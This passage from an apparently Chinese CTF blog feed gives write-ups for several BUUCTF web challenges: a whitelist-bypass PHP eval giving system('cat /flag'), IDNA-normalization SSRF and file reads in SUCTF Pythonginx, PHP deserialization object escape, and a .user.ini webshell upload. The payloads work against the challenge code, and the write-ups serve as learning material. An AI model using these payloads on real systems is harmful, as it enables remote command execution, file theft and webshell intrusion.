class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>理一下思路:首先他说字符长度不能超过80，其次只能使用白名单内的函数，所以这题的解题方向首先应该是需要使用$_GET之类的函数进行传参，并且要对这些函数做进制转化。<br>一步一步来吧,首先是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;system(&#39;cat &#x2F;flag&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>对于函数，可以利用动态函数的性质，即字符串做函数名，加上括号即可被当作函数执行</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">c=($_GET[a])($_GET[b])</span><br></pre></td></tr></table></figure>

<p>故此时我们构造的payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;($_GET[a])($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

<p>从过滤内容中可以发现过滤了中括号，以及get函数还有变量该怎么绕过呢？<br>1.变量绕过，我们可以使用白名单里面的变量，就pi，那么$_GET该如何构造呢？<br>这里就需要可变变量以及上面刚说过的字符串作为函数名执行绕过,解析一下一下payload：<br>base_convert(37907361743,10,36)可以将十进制数转为36进制，36进制就有A-Z的完整字符，接下来使用dechex(1598506324)将该十进制数转为十六进制数的$_GET，两边都转为后拼接起来即为:<br>hex2bin(“5f474554”)就为_GET然后和后面的$（可变变量引入）即可拼接处我们需要的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flagxxxxxxxxxx c&#x3D;$pi&#x3D;base_convert($pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flag)</span><br></pre></td></tr></table></figure>

<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>filter伪协议可读取</p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta"> @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>

<p>看了一下 原来他是这个意思，前两次的比对中不能等于suctf.cc，最后那次的比对中需要含有suctf.cc才可以进入urlopen，进行文件读取命令<br>这里就有个编码的漏洞:<br><a href="https://bugs.python.org/issue36216">https://bugs.python.org/issue36216</a><br>感觉还是实际去演示一遍并输出结果才能明了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        print(<span class="string">&quot;this is the oorgin&quot;</span>,uni)</span><br><span class="line">        url=<span class="string">&quot;http://suctf.c&#123;&#125;&quot;</span>.format(uni)</span><br><span class="line">        print(<span class="string">&quot;this is the orgin&quot;</span>,url)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">&quot;str: &quot;</span>+uni+<span class="string">&#x27; unicode: \\u&#x27;</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    print(<span class="string">&quot;this is first:&quot;</span>,host)</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    print(<span class="string">&quot;this is second:&quot;</span>,parts)</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    print(<span class="string">&quot;this is third:&quot;</span>,parts)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

<p>根据大神的脚本进行学习吧，这里用得是python3，导入了两个库<br>这边学习一下几个函数:<br><a href="https://my.oschina.net/u/2474096/blog/1593377">https://my.oschina.net/u/2474096/blog/1593377</a><br>这里是相关函数的作用，但是这里重点关注的是他们的解码结果<br>这里只取一组数据来观察:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this is first: suctf.cｃ</span><br><span class="line">this is second: [&#39;http&#39;, &#39;suctf.cｃ&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]</span><br><span class="line">this is third: [&#39;http&#39;, &#39;suctf.cc&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure>

<p>可以发现当解码形式为urlparse以及urlsplit的时候，不会转化原本的字符，但是当被idna编码再经由utf-8解码后，原本的这里成为怪异字符被转化为正常的字符c此时绕过成功<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210412170838.png" alt="img" style="zoom:50%;"></p>
<p>在python跑出来的C字符中选择一个进去拼接就行，我在burp里面跑，但可能没有编译这个字符所以没跑出来，回到url中就可以了，这里说一下为啥知道用file://协议，因为题目说就在suctf.cc中，那大概率就是以这个为根目录，类似于127.0.0.1，所以此时可以用file://协议直接访问（http协议中的知识点）<br>接下来寻找flag的位置，这题源码中给到提示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>

<p>那应该是在Nginx的配置目录吗？让我们康康</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;suctf.cⓒ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">?url&#x3D;file:&#x2F;&#x2F;suctf.cⓒ&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>buuctf9</title>
    <url>/2021/04/13/buuctf9/</url>
    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>反序列化题目:<a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)//定义过滤内容</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>);<span class="comment">//居然是过滤后缀？</span></span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $filter_arr) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter, <span class="string">&#x27;&#x27;</span>, $img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SESSION) &#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;<span class="comment">//这边可能要改一下user</span></span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$function) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;buuease_serialize.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_GET[<span class="string">&#x27;img_path&#x27;</span>]) &#123;<span class="comment">//get一个img_path</span></span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));<span class="comment">//对session进行序列化然后过滤内容。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($function == <span class="string">&#x27;highlight_file&#x27;</span>) &#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;buuease_serialize.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($function == <span class="string">&#x27;phpinfo&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!感觉这里只是告诉我们flag在哪个文件夹里面，其构造攻击手法还是得我们自己来</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($function == <span class="string">&#x27;show_image&#x27;</span>) &#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);<span class="comment">//进行反序列化。</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));<span class="comment">//目标就是进入这里</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>extract():e<br>函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>该函数返回成功设置的变量数目。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line">extract($my_array);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//$a = Cat; $b = Dog; $c = Horse</span></span><br></pre></td></tr></table></figure>

<p>大致清楚代码逻辑后，我们先看看phpinfo里面提供了啥信息:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210412203657.png" alt="img" style="zoom:67%;"></p>
<p>flag所在文件名~大概是要读取文件源码</p>
<p>前两天在学序列化的知识的时候有看到一个phar的似乎跟文件有关，然后这里也是允许？会不会有点搞头？继续往下看看</p>
<p>好的没有搞头，因为:根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p>
<p><strong>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</strong><br>本地测试抓包传一下值吧</p>
<p>需要解决的问题如下:<br>1.对于传入的img_path会进行加密处理，那么传入到unserialize内容中以后就无法被反序列化了<br>2.这里还有一个extract()函数，但是他会被filter过滤内容，所以这里要想想如何绕过，让反序列化执行我们的文件读取类。<br>好的想不出来，看wp发现</p>
<h4 id="PHP反序列化的对象逃逸"><a href="#PHP反序列化的对象逃逸" class="headerlink" title="PHP反序列化的对象逃逸"></a><strong>PHP反序列化的对象逃逸</strong></h4><p>这题和我在隔壁文档演示的又有点不太一样，这里我们获得文本的点在于 ：base64_decode($userinfo[‘img’])所以此时我们需要含有flag的字符串编码被序列化内容舍弃掉，如何舍弃呢？就是让前面的内容被过滤，那么序列化的字符串就会往下读取字符<br><strong>这里有个误区：后面读取文件的而是序列化内的img值，所以我们需要丢掉的是本来有的img值！也就是说我们传入的值要在程序本来自带的img的前面</strong></p>
<p>flag文件base64加密后为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZDBnM19mMWFnLnBocA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>救命 遇到大坑了，我们利用的是flag等字符会被转化为空来吃掉后面的字符，但是如果我们传入的数据时：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[img]&#x3D;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;img&quot;;s:4:&quot;aaaa&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这样子的话吃掉就是img，虽然多构造几个flag也能把function的48字符给吃掉，但是就无法传入img值也就是打开我们的flag:<br>//a:3:{s:4:”user”;s:24:””;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;s:8:”function”;s:<strong>46</strong>:”a”;s:3:”img”;s:4:”aaaa”;s:3:”img”;s:4:”aaaa”;}”;}</p>
<p>像这个有46的出现就报错了~所以要吃掉它呀！！！！！！就要和img互换位置，所以真正的payload为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;这里说明一下 最后还要构造一个s:2:&quot;dd&quot;;s:1:&quot;a&quot;;这个对象，因为这样才能把Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;这个图片给挤出去，不干扰我们的结果</span><br></pre></td></tr></table></figure>

<p>调试代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function filter($img)&#x2F;&#x2F;定义过滤内容</span><br><span class="line">&#123;</span><br><span class="line">    $filter_arr &#x3D; array(&#39;php&#39;, &#39;flag&#39;, &#39;php5&#39;, &#39;php4&#39;);&#x2F;&#x2F;居然是过滤后缀？</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $filter_arr) . &#39;&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter, &#39;&#39;, $img);</span><br><span class="line">&#125;</span><br><span class="line">$function &#x3D; &quot;a\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;\&quot;;s:2:\&quot;dd\&quot;;s:1:\&quot;a\&quot;;&#125;&quot;;</span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;flagflagflagflagflagflag&#39;;&#x2F;&#x2F;这边可能要改一下user为admin？</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line">$_SESSION[&#39;img&#39;]&#x3D;&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;</span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line">var_dump($serialize_info);</span><br><span class="line">$userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">var_dump($userinfo);</span><br></pre></td></tr></table></figure>



<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>这题不算难，但是坑不少，主要是细心问题，多调试很有用！！</p>
<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p><a href="http://www.zip源码泄露打开审计一下/">www.zip源码泄露打开审计一下</a>:<br>本地运行的时候需要注意 mysql要全部更改为mysqli（版本不同）</p>
<p>在本地运行调试了一下，发现有登录注册还有一个更新页面，登录注册页面没啥大问题，在更新页面可以上传文件并且将会被序列化，在序列化之前还会</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411165326.png" alt="img" style="zoom:67%;">

<p>针对我们传入的内容进行一下反序列化操作后使用了filter进行过滤:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15559564603&quot;;s:5:&quot;email&quot;;s:12:&quot;10452@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要做的就是让123”以后的内容被丢弃掉，和上一题差不多，然后这里如何吃字符呢？filter里面只有where替换为hacker能吃，所以就要输入很多个where</p>
<p>由于都有长度限制，并且只有nickname能全输出英文，所以需要绕过strlen函数，如何绕过呢？传入数组就行了接下来直接构造一下payload吧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nickname[]&#x3D;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>解释一下 由于我们传入的数组，所以序列化的过程中也是数组，所以s前面需要有个中括号和分号，才能达到闭合的效果<br>我们下载源码后，发现config里面有个flag，所以推测flag在这里<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210415210733.png" alt="img" style="zoom:67%;"></p>
<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结:"></a>小结:</h2><p>连续做了两题这个，感觉更加得心应手一些了总结一下就是:<br>1.filter在序列化之后，并且filter的是序列化后的内容<br>2.看看filter哪些可以吃字符<br>3.构造好闭合语句<br>4.让不要的字符被丢弃</p>
]]></content>
  </entry>
  <entry>
    <title>edusrc挖掘</title>
    <url>/2021/03/07/edusrc%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>buuctf3</title>
    <url>/2021/03/18/buuctf3/</url>
    <content><![CDATA[<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>尝试了一下sql注入，发现不行，注册了一个账号找找线索，抓包看看回显，发现<a id="more"></a><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210318200434.png" alt="img" style="zoom:67%;"><br>不知道是个啥，百度了一下，是一种安全措施，用了防止xss等攻击的。<br><strong>看完wp后，发现自己看的不够仔细，发现更改密码页面有github源码泄露，感觉自己经常被某种思路给束缚住？然后就忘记一些基操,以后要注意点</strong><br>刚看完了wp，确认过眼神，是不会做的题，现在靠印象复现一下思路:</p>
<h2 id="buy-you-flag"><a href="#buy-you-flag" class="headerlink" title="buy you flag"></a>buy you flag</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>抓包<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210319001101.png" alt="img" style="zoom:50%;"></p>
<p>总共更改这些地方，然后有一点没想到，看了wp他说有长度限制，<br>这里需要拓展学习一下strcmp字符串比较绕过，因为他无法比较数组的长度，<strong>所以在money后加个[]即可绕过</strong></p>
<p>这里有个思路没想清楚:他说有长度限制？这个时候我们应该想的是什么函数能比较长度？然后查询该函数能否被绕过:<br>按照这个思路果然可以找到线索，学习一下！</p>
<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>看了一下源码，可以确定的是如要传入一句话木马需要使用<br>&lt;script&gt;写的,刚才看到一个user.ini，感觉需要利用一下这个线索，去百度看看:<br>之前在学文件上传其实就有看到过这个user.ini 我简要讲解一下以及利用方式，这个是一个配置文件，可以动态调整，随改随用，但是权限为user，其中能为我们所用的就是：<br><strong>auto_prepend_file=**文件名<br>这个是可以使user.ini所在目录下的php文件包含某个文件，比如说<br>在user.ini中我配置了</strong>auto_prepend_file=12.gif**在这个目录下有一个index.php，当我打开index.php的时候就自动包含了12.gif，文件包含会自动执行其中php代码。</p>
<p>所以整体思路就是，先上传user.ini，然后上传12.gif，然后打开index.php页面使用蚁剑连接即可:<br>文件上传绕过只要添加一个图像头就可以，比如GIF98a,一句话木马使用&lt;script&gt;书写方式</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210319010311.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210319010314.png" alt="img" style="zoom:67%;">
成功包含

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210319010416.png" alt="img" style="zoom:67%;">
成功连接
flag{fe873bd0-b289-495f-8254-ec9f4e68b1e6}
flag{ed3c91a9-9f59-480e-8595-a410ad4e6175}拿到flag

